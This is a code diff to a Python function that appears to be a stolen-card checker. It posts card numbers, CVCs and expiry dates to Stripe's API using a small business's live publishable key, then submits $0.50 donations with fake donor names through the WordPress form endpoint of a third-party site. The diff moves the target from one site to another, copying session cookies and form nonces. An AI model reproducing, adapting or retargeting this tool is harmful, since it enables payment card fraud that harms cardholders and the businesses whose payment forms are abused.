@@ -14,66 +14,80 @@ def Tele(ccx):
 	r = requests.session()
 
 	headers = {
-	'authority': 'api.stripe.com',
-    'accept': 'application/json',
-    'accept-language': 'en-US,en;q=0.9',
-    #'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://js.stripe.com',
-    'referer': 'https://js.stripe.com/',
-    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-site',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+	    'authority': 'api.stripe.com',
+	    'accept': 'application/json',
+	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'content-type': 'application/x-www-form-urlencoded',
+	    'origin': 'https://js.stripe.com',
+	    'referer': 'https://js.stripe.com/',
+	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-site',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
-
-	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F4901af2b6b%3B+stripe-js-v3%2F4901af2b6b%3B+card-element&referrer=https%3A%2F%2Fwww.aaronabke.com&time_on_page=125965&key=pk_live_51GGaWMAJSPmZlL2afbQZDpv2vTIB3894XGGxamKUqTCkHjOi5xT0xBMn8GYDCIiWqs2T6mFpst5ZwqnwlJzghdDC00HIeZ9lw8'
+	
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fa737e82bd0%3B+stripe-js-v3%2Fa737e82bd0%3B+card-element&key=pk_live_51OGuVJJSlvu2pbvHUCSF90qKHbTOMFP7CwVkMup0r0NBY6YKj5F429W0ImCUyP1RaOJuiYC0FfVyFW1YzKHajgiA00nqN47tcP'
+	
 	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
-
+	
 	pm = r1.json()['id']
-
+	
 	cookies = {
-	'cookie_notice_accepted': 'true',
-    '__stripe_mid': 'cb5695ff-1616-4211-9160-a9e81e4a1c4b350bba',
-    '__stripe_sid': '41dfc9d3-045f-4734-8d8c-413993407ae2384840',
+	    'nitroCachedPage': '0',
+	    '_gcl_au': '1.1.66036949.1744749062',
+	    '_ga': 'GA1.3.1070660164.1744749061',
+	    '_gid': 'GA1.3.486536076.1744749064',
+	    '_gat_UA-213518938-1': '1',
+	    '_hjSessionUser_3158161': 'eyJpZCI6IjM5Y2Q1NzA5LWUzNDYtNThiZC1iYzYxLTdiNmU3MDhjN2Y3ZSIsImNyZWF0ZWQiOjE3NDQ3NDkwNjQ0NDMsImV4aXN0aW5nIjp0cnVlfQ==',
+	    '_hjSession_3158161': 'eyJpZCI6IjEzZTMyMDM0LTM2NWUtNGE5YS04M2MxLWVjN2Q1ZDQ0MTgyMyIsImMiOjE3NDQ3NDkwNjQ0NDgsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=',
+	    '_fbp': 'fb.2.1744749065247.45734606816285652',
+	    '_ga_RNL9BQ376F': 'GS1.3.1744749065.1.0.1744749065.0.0.0',
+	    'PHPSESSID': '3e34655be80b7d85850811c50f50e5e4',
+	    '__stripe_mid': '69089077-5867-40f7-ae32-1064b8354e322a04b2',
+	    '__stripe_sid': '73ef39f6-d0d9-451b-bfb6-fcbbf93497e08613e0',
+	    '_ga_49Y935403S': 'GS1.1.1744749061.1.1.1744749113.0.0.0',
+	    '_ga_4LWD5S7HLJ': 'GS1.1.1744749062.1.1.1744749113.0.0.0',
 	}
-
+	
 	headers = {
-	'authority': 'www.aaronabke.com',
-    'accept': '*/*',
-    'accept-language': 'en-US,en;q=0.9',
-    #'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    'origin': 'https://www.aaronabke.com',
-    'referer': 'https://www.aaronabke.com/donate/',
-    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
-    'x-requested-with': 'XMLHttpRequest',
+	    'authority': 'www.floodrestorationaustralia.com.au',
+	    'accept': '*/*',
+	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+	    # 'cookie': 'nitroCachedPage=0; _gcl_au=1.1.66036949.1744749062; _ga=GA1.3.1070660164.1744749061; _gid=GA1.3.486536076.1744749064; _gat_UA-213518938-1=1; _hjSessionUser_3158161=eyJpZCI6IjM5Y2Q1NzA5LWUzNDYtNThiZC1iYzYxLTdiNmU3MDhjN2Y3ZSIsImNyZWF0ZWQiOjE3NDQ3NDkwNjQ0NDMsImV4aXN0aW5nIjp0cnVlfQ==; _hjSession_3158161=eyJpZCI6IjEzZTMyMDM0LTM2NWUtNGE5YS04M2MxLWVjN2Q1ZDQ0MTgyMyIsImMiOjE3NDQ3NDkwNjQ0NDgsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; _fbp=fb.2.1744749065247.45734606816285652; _ga_RNL9BQ376F=GS1.3.1744749065.1.0.1744749065.0.0.0; PHPSESSID=3e34655be80b7d85850811c50f50e5e4; __stripe_mid=69089077-5867-40f7-ae32-1064b8354e322a04b2; __stripe_sid=73ef39f6-d0d9-451b-bfb6-fcbbf93497e08613e0; _ga_49Y935403S=GS1.1.1744749061.1.1.1744749113.0.0.0; _ga_4LWD5S7HLJ=GS1.1.1744749062.1.1.1744749113.0.0.0',
+	    'origin': 'https://www.floodrestorationaustralia.com.au',
+	    'referer': 'https://www.floodrestorationaustralia.com.au/payments/',
+	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-origin',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+	    'x-requested-with': 'XMLHttpRequest',
 	}
 	
 	params = {
-    't': '1744452945936',
-}
-
+	    't': '1744749114136',
+	}
+	
 	data = {
-    'data': 'item_4__fluent_sf=&__fluent_form_embded_post_id=884&_fluentform_4_fluentformnonce=7a04a2239d&_wp_http_referer=%2Fdonate%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser08%40gmail.com&custom-payment-amount=&payment_input=0&payment_input_custom_0=0.50&payment_input_custom_1=&input_text=&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
-    'action': 'fluentform_submit',
-    'form_id': '4',
-}
+	    'data': '__fluent_form_embded_post_id=240208&_fluentform_4_fluentformnonce=e8d1f32881&_wp_http_referer=%2Fpayments%2F&numeric-field=1&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser22%40gmail.com&custom-payment-amount_2=0.50&custom-payment-amount_1=&payment_method=stripe&__stripe_payment_method_id='+str(pm)+'',
+	    'action': 'fluentform_submit',
+	    'form_id': '4',
+	}
 	
 	r2 = session.post(
-			'https://www.aaronabke.com/wp-admin/admin-ajax.php',
-			params=params,
-			cookies=cookies,
-			headers=headers,
-			data=data,
+	    'https://www.floodrestorationaustralia.com.au/wp-admin/admin-ajax.php',
+	    params=params,
+	    cookies=cookies,
+	    headers=headers,
+	    data=data,
 	)
+	
 	result2 = r2.text
 	return result2
 	
